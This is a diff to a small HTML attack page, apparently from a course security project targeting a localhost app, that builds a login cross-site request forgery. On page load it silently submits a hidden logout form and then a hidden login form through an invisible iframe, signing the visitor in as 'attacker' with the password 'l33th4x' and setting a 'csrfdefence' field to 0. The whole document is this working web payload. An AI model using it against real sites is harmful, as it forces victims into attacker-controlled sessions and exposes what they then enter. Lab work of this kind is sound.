@@ -1,6 +1,8 @@
 <html>
     <iframe name="displaynone", style="display: none"></iframe>
-    <form id="thing", target="displaynone", action="http://localhost/project2/login", method="post", style="display: none">
+    <form id="logout", target="displaynone", action="http://localhost/project2/logout", method="post", style="display: none">
+    </form>
+    <form id="login", target="displaynone", action="http://localhost/project2/login", method="post", style="display: none">
         <input name="username", value="attacker">
         <input name ="password", value="l33th4x">
         <input name="csrfdefence", value="0">
@@ -8,7 +10,8 @@
     </form>
 
     <script>
-        document.getElementById("thing").submit()
+        document.getElementById("logout").submit()
+        document.getElementById("login").submit()
     </script>
 
 </html>
